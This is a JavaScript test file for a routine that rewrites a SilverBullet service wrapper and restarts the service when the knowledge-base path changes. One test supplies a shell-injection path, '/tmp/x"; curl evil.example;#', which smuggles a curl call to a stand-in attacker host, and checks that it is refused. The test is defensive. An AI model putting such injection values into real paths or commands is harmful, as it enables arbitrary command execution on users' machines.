// kb-remount.test.js — remounting SilverBullet when the instance kb_path
// changes. The module shells out and writes files, so `run` is injected and
// the wrapper/unit live in a temp HOME; nothing here touches the real system.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { remountSilverbullet } from '../src/kb-remount.js';
import { silverbulletSpec, silverbulletWrapper } from '../src/service.js';

const OLD = '/home/u/punchlist/data/kb';
const NEW = '/home/u/vault/kb';
// A realistic wrapper: the env-file source line carries SilverBullet's
// credentials, and the exec line names a RESOLVED absolute binary — both
// things a naive "regenerate from spec" would destroy.
const CMD = '/home/u/.local/share/punchlist/silverbullet/2.10.0/silverbullet';

// Lay down a temp HOME with an installed wrapper + unit, as
// `punchlist install-silverbullet` would have left it.
function install(spaceDir = OLD, { wrapper } = {}) {
  const home = mkdtempSync(join(tmpdir(), 'kbremount-'));
  const spec = silverbulletSpec('linux', { spaceDir, home });
  for (const p of [spec.wrapperPath, spec.path]) mkdirSync(join(p, '..'), { recursive: true });
  const envFile = join(home, '.config', 'punchlist', 'silverbullet.env');
  writeFileSync(spec.wrapperPath, wrapper ?? silverbulletWrapper({
    cmd: CMD, spaceDir, host: '127.0.0.1', port: 3001, envFile,
  }));
  writeFileSync(spec.path, spec.contents);
  return { home, spec, cleanup: () => rmSync(home, { recursive: true, force: true }) };
}

// Collects the commands remountSilverbullet would have run.
function recorder() {
  const calls = [];
  return { calls, run: (cmd, args) => calls.push([cmd, args.join(' ')]) };
}

test('kb_path change: rewrites only the space dir and restarts the service', () => {
  const { home, spec, cleanup } = install();
  const { calls, run } = recorder();
  const before = readFileSync(spec.wrapperPath, 'utf8');

  const r = remountSilverbullet({ dataDir: '/unused', kbPath: NEW, home, platform: 'linux', run });

  assert.deepEqual(r, { remounted: true, reason: 'remounted', spaceDir: NEW });
  const after = readFileSync(spec.wrapperPath, 'utf8');
  assert.match(after, new RegExp(`"${NEW}"\\s*$`));
  assert.doesNotMatch(after, new RegExp(OLD));
  // the resolved binary path and the credentials env-file source both survive
  assert.match(after, new RegExp(CMD.replace(/[.]/g, '\\.')));
  assert.match(after, /silverbullet\.env/);
  assert.equal(after.split('\n').length, before.split('\n').length);
  assert.deepEqual(calls, [['systemctl', '--user restart punchlist-silverbullet.service']]);
  cleanup();
});

test('empty kb_path falls back to <dataDir>/kb', () => {
  const { home, spec, cleanup } = install();
  const { run } = recorder();
  const r = remountSilverbullet({ dataDir: '/srv/pl/data', kbPath: '  ', home, platform: 'linux', run });
  assert.equal(r.spaceDir, '/srv/pl/data/kb');
  assert.match(readFileSync(spec.wrapperPath, 'utf8'), /"\/srv\/pl\/data\/kb"\s*$/);
  cleanup();
});

test('no-op when the space dir is already correct — no restart', () => {
  const { home, cleanup } = install(NEW);
  const { calls, run } = recorder();
  const r = remountSilverbullet({ dataDir: '/unused', kbPath: NEW, home, platform: 'linux', run });
  assert.equal(r.remounted, false);
  assert.equal(r.reason, 'unchanged');
  assert.deepEqual(calls, []);
  cleanup();
});

// The operator never ran `install-silverbullet`; changing kb_path must not
// provision a service they didn't ask for.
test('not installed: does nothing, reports not-installed', () => {
  const home = mkdtempSync(join(tmpdir(), 'kbremount-'));
  const { calls, run } = recorder();
  const r = remountSilverbullet({ dataDir: '/unused', kbPath: NEW, home, platform: 'linux', run });
  assert.equal(r.reason, 'not-installed');
  assert.deepEqual(calls, []);
  rmSync(home, { recursive: true, force: true });
});

test('unrecognized wrapper is left untouched rather than rewritten', () => {
  const wrapper = '#!/bin/sh\n# hand-edited; no exec line we understand\n';
  const { home, spec, cleanup } = install(OLD, { wrapper });
  const { calls, run } = recorder();
  const logs = [];
  const r = remountSilverbullet({ dataDir: '/unused', kbPath: NEW, home, platform: 'linux', run, log: m => logs.push(m) });
  assert.equal(r.reason, 'unrecognized-wrapper');
  assert.equal(readFileSync(spec.wrapperPath, 'utf8'), wrapper);
  assert.deepEqual(calls, []);
  assert.equal(logs.length, 1);
  cleanup();
});

// A double quote would close the quoted argument and hand the rest to the
// shell — refuse instead of writing it.
test('refuses a space dir containing a double quote', () => {
  const { home, spec, cleanup } = install();
  const { calls, run } = recorder();
  const r = remountSilverbullet({
    dataDir: '/unused', kbPath: '/tmp/x"; curl evil.example;#', home, platform: 'linux', run, log: () => {},
  });
  assert.equal(r.reason, 'unsafe-path');
  assert.match(readFileSync(spec.wrapperPath, 'utf8'), new RegExp(`"${OLD}"`));
  assert.deepEqual(calls, []);
  cleanup();
});

// The wrapper is already updated at this point, so the new space dir takes
// effect on the next start either way — report, don't try to unwind.
test('restart failure is reported but the rewrite stands', () => {
  const { home, spec, cleanup } = install();
  const logs = [];
  const r = remountSilverbullet({
    dataDir: '/unused', kbPath: NEW, home, platform: 'linux',
    run: () => { throw new Error('unit not loaded'); }, log: m => logs.push(m),
  });
  assert.equal(r.reason, 'restart-failed');
  assert.match(readFileSync(spec.wrapperPath, 'utf8'), new RegExp(`"${NEW}"`));
  assert.match(logs[0], /unit not loaded/);
  cleanup();
});

test('darwin: unload+load the plist instead of systemctl restart', () => {
  const home = mkdtempSync(join(tmpdir(), 'kbremount-'));
  const spec = silverbulletSpec('darwin', { spaceDir: OLD, home });
  for (const p of [spec.wrapperPath, spec.path]) mkdirSync(join(p, '..'), { recursive: true });
  writeFileSync(spec.wrapperPath, silverbulletWrapper({
    cmd: CMD, spaceDir: OLD, host: '127.0.0.1', port: 3001, envFile: '/x/env',
  }));
  writeFileSync(spec.path, spec.contents);
  const { calls, run } = recorder();

  const r = remountSilverbullet({ dataDir: '/unused', kbPath: NEW, home, platform: 'darwin', run });

  assert.equal(r.remounted, true);
  assert.deepEqual(calls, [['launchctl', `unload ${spec.path}`], ['launchctl', `load -w ${spec.path}`]]);
  rmSync(home, { recursive: true, force: true });
});

test('unsupported platform is reported, not thrown', () => {
  const { calls, run } = recorder();
  const r = remountSilverbullet({
    dataDir: '/unused', kbPath: NEW, home: '/nonexistent', platform: 'sunos', run, log: () => {},
  });
  assert.equal(r.remounted, false);
  assert.deepEqual(calls, []);
});
